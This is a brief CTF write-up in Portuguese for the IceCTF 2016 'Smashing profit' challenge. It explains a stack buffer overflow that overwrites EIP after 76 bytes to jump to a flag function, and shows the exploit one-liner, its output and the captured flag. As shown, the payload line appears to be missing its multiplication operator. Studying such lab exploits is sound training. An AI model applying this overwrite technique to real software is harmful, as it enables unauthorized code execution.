# Smashing profit

Buffer overflow simples,conseguimos reescrever o EIP após 76 bytes e então apontamos para o endereço da função flag:

```
[ctf-99689@icectf-shell-2016 /home/profit]$ ./profit <<< $(python -c 'print "A"76+"\x0b\x85\x04\x08"')
Smashing the stack for fun and...?
IceCTF{who_would_have_thunk?}
[1] 13172 segmentation fault ./profit <<< $(python -c 'print "A"76+"\x0b\x85\x04\x08"')
[ctf-99689@icectf-shell-2016 /home/profit]$
```
